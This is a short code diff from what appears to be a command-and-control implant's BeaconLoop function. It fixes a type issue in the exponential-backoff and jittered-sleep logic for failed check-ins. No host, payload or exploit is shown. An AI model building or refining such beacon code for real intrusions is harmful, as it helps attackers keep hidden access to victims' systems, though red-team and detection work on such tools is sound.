@@ -921,7 +921,7 @@ VOID BeaconLoop() {
                 DebugLog(L"Beacon fail #" + std::to_wstring(failures));
 
                 // Exponential backoff capped at 30 min
-                DWORD backoffSec = config::BEACON_MIN * (1u << std::min(failures - 1u, 6u));
+                DWORD backoffSec = config::BEACON_MIN * (1u << std::min<DWORD>(failures - 1u, 6u));
                 if (backoffSec > 1800) backoffSec = 1800;
                 DebugLog(L"Backoff " + std::to_wstring(backoffSec) + L"s");
                 JitterSleep(backoffSec, backoffSec + 30);
